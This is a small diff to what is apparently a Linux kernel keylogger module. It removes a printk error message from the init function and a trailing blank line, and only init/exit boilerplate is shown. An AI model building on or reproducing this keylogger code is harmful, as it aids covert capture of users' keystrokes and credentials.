@@ -13,7 +13,6 @@ static int __init keylogger_init(void)
 {
 	int rc = sys_calls_init();
 	if (rc != 0) {
-		printk(KERN_INFO "Couldn't initialize sys calls layer");
 		return -1;
 	}
 
@@ -34,4 +33,3 @@ static void __exit keylogger_exit(void)
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
-
